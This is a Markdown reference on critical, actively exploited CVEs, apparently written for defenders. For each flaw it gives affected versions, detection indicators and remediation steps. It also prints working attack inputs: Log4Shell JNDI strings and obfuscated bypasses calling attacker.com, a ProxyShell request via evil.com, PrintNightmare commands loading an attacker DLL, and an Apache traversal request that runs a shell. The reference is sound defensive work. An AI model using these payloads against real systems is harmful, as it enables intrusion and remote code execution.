# CVE Reference

Critical and high-impact vulnerabilities with exploitation context, affected versions, detection indicators, and remediation guidance. Organized by category with a focus on vulnerabilities actively exploited in the wild.

---

## Scoring References

| Score | CVSS Severity | Action |
|---|---|---|
| 9.0-10.0 | Critical | Patch within 24-72 hours; emergency change if exploited in wild |
| 7.0-8.9 | High | Patch within 7-14 days; prioritize internet-facing systems |
| 4.0-6.9 | Medium | Patch within 30 days |
| 0.1-3.9 | Low | Patch in next maintenance cycle |

**EPSS (Exploit Prediction Scoring System)**: Probability that a CVE will be exploited in the next 30 days. CISA KEV (Known Exploited Vulnerabilities) catalog indicates confirmed active exploitation.

---

## Microsoft Exchange (2021-2023)

### CVE-2021-26855 — ProxyLogon (CVSS 9.8)
**Vulnerability**: Pre-authentication SSRF in Exchange Server allowing an attacker to authenticate as the Exchange server itself, bypassing authentication entirely.

**Affected**: Exchange Server 2013, 2016, 2019 (on-premises only; Exchange Online not affected)

**Exploitation Chain (ProxyLogon + ProxyShell combo)**:
1. CVE-2021-26855: SSRF to reach Exchange backend as SYSTEM
2. CVE-2021-26857: Insecure deserialization to run code as SYSTEM
3. CVE-2021-26858 / CVE-2021-27065: Post-auth arbitrary file write to drop webshell

**Threat Actors**: HAFNIUM (Chinese nation-state), Tick, LuckyMouse, Calypso, DearCry ransomware operators

**Detection**:
- IIS logs: `POST /owa/auth/Current/themes/resources/` or similar with unusual User-Agent
- Event 1310 in Application log: `MSExchange Common` errors
- Suspicious ASPX files in: `C:\inetpub\wwwroot\aspnet_client\`, Exchange `owa` directories
- New Exchange Virtual Directory or application pool creation

**Remediation**: Apply KB5000871 cumulative update; run Microsoft Safety Scanner; audit virtual directories and hybrid connector configuration

---

### CVE-2021-34473 / 34523 / 31207 — ProxyShell (CVSS 9.8 / 9.8 / 7.2)
**Vulnerability**: Three-CVE chain discovered by Orange Tsai at Black Hat 2021. Pre-authentication RCE chain via Exchange PowerShell backend.

**Exploitation**:
```
POST /autodiscover/autodiscover.json?@evil.com/autodiscover/autodiscover.json%3FPowerShell=1 HTTP/1.1
Host: exchange.victim.com
```
Used by: Conti, BlackByte, Babuk ransomware groups; LockFile; Squirrelwaffle

**Detection**: Look for PowerShell remoting over HTTP to Exchange endpoints; unusual `autodiscover.json` request patterns

---

## Log4j (2021)

### CVE-2021-44228 — Log4Shell (CVSS 10.0)**Vulnerability**: JNDI injection in Apache Log4j 2 logging library allowing unauthenticated RCE. The `${jndi:ldap://attacker.com/a}` string in any logged field triggers outbound LDAP lookup, enabling code execution.
**Affected**: Log4j 2.0-beta9 through 2.14.1; Java 8u191 and earlier most exploitable (disableURLCodebase bypass needed for newer Java)

**Attack Strings**:
```${jndi:ldap://attacker.com/exploit}
${jndi:rmi://attacker.com/exploit}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}  # Obfuscated
${j${::-n}di:...}  # Nested variable bypass
```

**Exploitation Timeline**:
- Dec 9, 2021: Public disclosure (PoC published before patch)
- Dec 9-10: Mass scanning observed within hours
- Dec 12: Khonsari ransomware deployed via Log4Shell
- Dec 2021+: Cobalt Strike beaconing, cryptominer deployment widespread
- 2022-2023: Still exploited by APT groups against unpatched infrastructure

**Detection**:
- WAF: Block `${jndi:` in all HTTP fields (URI, headers, body, User-Agent, Referer)
- SIEM: Outbound LDAP (389, 636) or RMI (1099) connections from application servers
- EDR: Java process spawning shell (java.exe -> cmd.exe/sh)
- Zeek/Suricata: DNS queries from Java processes to external resolvers

**Remediation**: Upgrade to Log4j 2.17.1+ (2.12.4 for Java 7, 2.3.2 for Java 6); set `log4j2.formatMsgNoLookups=true` as temporary mitigation; block outbound LDAP at perimeter

---

## Windows Print Spooler (2021)

### CVE-2021-34527 — PrintNightmare (CVSS 8.8)
**Vulnerability**: Incorrect ACL check in Windows Print Spooler service (spoolsv.exe). Allows non-admin domain users to install a malicious printer driver, executing code as SYSTEM.

**Affected**: All Windows versions with Print Spooler enabled (on by default, including Domain Controllers)

**Exploitation**:
```python
# Impacket PrintNightmare exploit
python3 CVE-2021-1675.py DOMAIN/user:password@DC_IP '\\ATTACKER\share\evil.dll'
# Using Invoke-Nightmare PowerShell module
Invoke-Nightmare -NewUser "hacker" -NewPassword "Password123!" -DriverName "PrintMe"
```

**Detection**:
- Event 808 in Microsoft-Windows-PrintService/Admin: Printer driver install
- Sysmon 7 (ImageLoad) or 11 (FileCreate): DLL loaded from `\spool\DRIVERS\`
- Suspicious spoolsv.exe child processes (cmd.exe, powershell.exe)

**Remediation**: Disable Print Spooler on Domain Controllers (critical); restrict Point and Print (NoWarningNoElevationOnInstall = 0); apply KB5005010

---

## MOVEit Transfer (2023)

### CVE-2023-34362 — MOVEit SQL Injection (CVSS 9.8)
**Vulnerability**: SQL injection in MOVEit Transfer web application leading to unauthenticated RCE. Exploited by Cl0p ransomware group in May-June 2023 mass exploitation campaign.

**Affected**: MOVEit Transfer (all versions before June 2023 patches)

**Exploitation**: Attacker sends crafted HTTP POST to `/moveitisapi/moveitisapi.dll` or `/api/v1/token` endpoint, injecting SQL to enumerate DB contents, then uploads a webshell (`human2.aspx`) to gain persistent access.

**Scale**: 2,700+ organizations affected; 90+ million individuals' data exposed; victims included US federal agencies (DoE, OPM), BBC, British Airways, Shell, Siemens, Ernst & Young

**Detection**:
- IIS logs: Unexpected POST to `/human2.aspx` or unusual API token requests with long payloads
- File creation: `C:\MOVEitTransfer\wwwroot\human2.aspx` or other ASPX files
- Outbound data transfer from MOVEit server to unusual destinations
- YARA: Search for MOVEit webshell strings in ASPX files

**Remediation**: Apply Progress Software patches from June 2023; remove any `human2.aspx` or unauthorized ASPX files; reset service account credentials; audit all user accounts and audit logs

---

## Citrix Bleed (2023)

### CVE-2023-4966 — Citrix Bleed (CVSS 9.4)
**Vulnerability**: Buffer overflow in Citrix NetScaler ADC and Gateway allows unauthenticated attackers to retrieve session tokens from device memory, bypassing MFA and hijacking authenticated sessions.

**Affected**: NetScaler ADC and Gateway before patches released October 2023

**Exploitation**: Simple HTTP GET request with oversized `Host` header causes buffer over-read, leaking session memory containing valid authentication tokens. No credentials required.

```
GET /oauth/idp/.well-known/openid-configuration HTTP/1.1
Host: [2000+ byte string]
```

**Threat Actors**: LockBit ransomware, Medusa ransomware, Boeing breach (LockBit), Industrial and Commercial Bank of China breach

**Detection**:
- NetScaler logs: Abnormally large Host headers in HTTP access logs
- Unexplained authenticated sessions from new IP addresses (especially outside business hours)
- NetScaler audit logs: Session creation without corresponding authentication events

**Remediation**: Apply CTX579459 patches immediately; invalidate ALL active sessions after patching (critical — existing sessions remain hijackable even after patching without session termination)

---

## ConnectWise ScreenConnect (2024)

### CVE-2024-1709 / 1708 — ConnectWise Authentication Bypass + Path Traversal (CVSS 10.0 / 8.4)
**Vulnerability**: Authentication bypass via alternate path allows unauthenticated attacker to create admin account, then path traversal enables arbitrary file upload — full unauthenticated RCE.

**Affected**: ScreenConnect on-premises versions before 23.9.8

**Exploitation**: Attack chain in two steps:
1. `GET /SetupWizard.aspx` — accessible without auth due to setup wizard bypass
2. Create new admin user via setup wizard
3. Use new credentials to upload and execute arbitrary files

**Scale**: Mass exploitation within 48 hours of disclosure (February 2024); used by Black Basta, LockBit affiliates, ransomware operators

**Detection**:
- IIS/web logs: POST requests to `/SetupWizard.aspx` after initial setup completion
- New admin user creation in ScreenConnect audit logs
- Unusual file uploads or webshell creation in ScreenConnect extension directory

**Remediation**: Upgrade to 23.9.8+; if on-premises not patchable, restrict SetupWizard.aspx access at WAF; audit admin accounts; consider cloud-hosted ScreenConnect

---

## Ivanti VPN (2023-2024)

### CVE-2023-46805 / CVE-2024-21887 — Ivanti Connect Secure Auth Bypass + RCE (CVSS 8.2 / 9.1)
**Vulnerability**: Authentication bypass (CVE-2023-46805) chained with command injection (CVE-2024-21887) enabling unauthenticated RCE on Ivanti Connect Secure and Policy Secure VPN appliances.

**Affected**: Ivanti Connect Secure 9.x, 22.x; Ivanti Policy Secure 9.x, 22.x

**Exploitation**: Chained attack bypasses authentication via path traversal, then injects OS commands through unvalidated HTTPS endpoint.

**Threat Actors**: UNC5221 (China-nexus), VOLT TYPHOON-adjacent, ransomware operators; CISA issued emergency directive

**Post-Exploitation**: GLASSTOKEN and LIGHTWIRE webshells, THINSPOOL dropper, Ivanti Integrity Checker Tool bypass (attackers modified the checker itself)

**Detection**:
- Ivanti logs: Unusual requests to `/api/v1/totp/user-backup-code/` endpoint
- Unexpected outbound connections from VPN appliance
- New files in `/data/var/run/`, `/tmp/`, or web-facing directories
- Run Ivanti's External Integrity Checker Tool (not the built-in one, which attackers modified)

**Remediation**: Apply patches per Ivanti advisories; if compromised, perform full factory reset before patching; revoke all certificates from affected devices; rotate all credentials of accounts that accessed VPN

---

## Microsoft Windows (2022-2024)

### CVE-2022-30190 — Follina (CVSS 7.8)
**Vulnerability**: MSDT (Microsoft Support Diagnostic Tool) code execution via a specially crafted Office document or HTML page, exploitable without macros. Used the `ms-msdt:` URI handler.

**Exploitation**: Malicious `.docx` file or HTML page triggers MSDT with attacker-controlled PowerShell parameters. No macro execution needed; Preview Pane is sufficient attack vector in some configs.

**Threat Actors**: APT28, UAC-0149 (targeting Ukraine), TA413, numerous phishing campaigns

**Detection**:
- Sysmon 1/EDR: `msdt.exe` or `pcalua.exe` spawning PowerShell or cmd
- Event 4688: Suspicious child process of winword.exe or browser

**Remediation**: Disable MSDT URL protocol via registry; apply KB5014699; patch monthly

---

### CVE-2023-23397 — Outlook NTLM Hash Theft (CVSS 9.8)
**Vulnerability**: Zero-click Outlook vulnerability. A specially crafted meeting request with a UNC path in the `PidLidReminderFileParameter` property automatically triggers NTLM authentication to attacker-controlled server when Outlook processes the reminder, leaking the user's NTLMv2 hash — no user interaction required.

**Affected**: Outlook for Windows (not Outlook on the web, macOS, or mobile)

**Exploitation**: Send victim a calendar invite with: `\\ATTACKER-IP\share\` in the sound file parameter. When Outlook processes the reminder (even with screen locked), it authenticates via NTLM. Attacker captures NTLMv2 hash and cracks or relays it.

**Threat Actors**: APT28/Fancy Bear (Russian GRU) — exploited before patch as 0-day

**Detection**:
- Network: Unexpected SMB (445) or WebDAV connections from Outlook process
- Event 4625: Failed NTLM authentication from unusual source IPs after calendar events processed

**Remediation**: Apply KB5023397; add users to Protected Users group (disables NTLM); block outbound SMB at perimeter (port 445 to external IPs)

---

### CVE-2024-38063 — Windows TCP/IP RCE (CVSS 9.8)
**Vulnerability**: Integer underflow in Windows TCP/IP stack triggered by specially crafted IPv6 packets, allowing unauthenticated remote code execution. Zero-click, no user interaction required.

**Affected**: Windows 10, 11, Server 2008-2022 with IPv6 enabled

**Remediation**: Apply August 2024 Patch Tuesday update; disable IPv6 if not needed (`netsh interface ipv6 set global randomizeidentifiers=disabled state=disabled`)

---

## Apache / Web Application Vulnerabilities

### CVE-2021-41773 / 42013 — Apache Path Traversal (CVSS 7.5 / 9.8)
**Vulnerability**: Path traversal and RCE in Apache HTTP Server 2.4.49-2.4.50. Attacker can read arbitrary files from outside the server root or execute CGI scripts.

```bash
curl 'http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'echo Content-Type: text/plain; echo; id'
```

**Remediation**: Upgrade to Apache 2.4.51+

---

### CVE-2022-22965 — Spring4Shell (CVSS 9.8)
**Vulnerability**: Data binding vulnerability in Spring Framework allowing RCE via specially crafted HTTP request. Exploits Java classloader chain to write a JSP webshell.

**Affected**: Spring Framework 5.3.x before 5.3.18, 5.2.x before 5.2.20; requires JDK 9+, Spring-webmvc or Spring-webflux on Tomcat WAR deployment

**Detection**: Unusual POST parameters containing `class.module.classLoader.resources.context.parent.pipeline.first.*`

---

## CISA KEV Quick Reference

The CISA Known Exploited Vulnerabilities (KEV) catalog tracks CVEs confirmed exploited in the wild. All KEV entries carry mandatory remediation timelines for US federal agencies and represent highest-priority patching for any organization.

| Stat | Value |
|---|---|
| KEV catalog URL | [cisa.gov/known-exploited-vulnerabilities-catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) |
| JSON feed | [cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json](https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json) |
| Federal civilian agency patch deadline | 15 days (critical) to 6 months |
| Best practice for all orgs | Treat KEV entries as P1 — patch within 2 weeks regardless of CVSS |

**Monitoring KEV for New Entries**:
```bash
# Fetch current KEV catalog and check for new additions
curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json | \
  python3 -c "import json,sys; k=json.load(sys.stdin); [print(v['cveID'], v['dateAdded'], v['vulnerabilityName']) for v in sorted(k['vulnerabilities'], key=lambda x: x['dateAdded'], reverse=True)[:20]]"
```

## Vulnerability Tracking Resources

| Resource | URL | Use Case |
|---|---|---|
| NVD (NIST) | [nvd.nist.gov](https://nvd.nist.gov/) | Official CVE details, CVSS scores, CWE mapping |
| CISA KEV | [cisa.gov/known-exploited-vulnerabilities-catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) | Confirmed exploited vulnerabilities |
| EPSS | [first.org/epss](https://www.first.org/epss/) | Exploitation probability scoring |
| Exploit-DB | [exploit-db.com](https://www.exploit-db.com/) | Public exploits and PoCs |
| Packet Storm | [packetstormsecurity.com](https://packetstormsecurity.com/) | Exploits, advisories, tools |
| VulnDB | [vulndb.cyberriskanalytics.com](https://vulndb.cyberriskanalytics.com/) | Commercial vulnerability intelligence |
| Nuclei Templates | [github.com/projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates) | Scanner templates for CVE detection |
| Vulhub | [github.com/vulhub/vulhub](https://github.com/vulhub/vulhub) | Docker-based vulnerable environments for testing |

## Related Resources
- [Notable Incidents](NOTABLE_INCIDENTS.md) — Real-world campaigns exploiting these vulnerabilities
- [Vulnerability Management Discipline](disciplines/vulnerability-management.md) — VM lifecycle and prioritization
- [IR Playbooks](IR_PLAYBOOKS.md) — Response procedures for exploitation events
- [Privilege Escalation Reference](PRIVESC_REFERENCE.md) — Post-exploitation techniques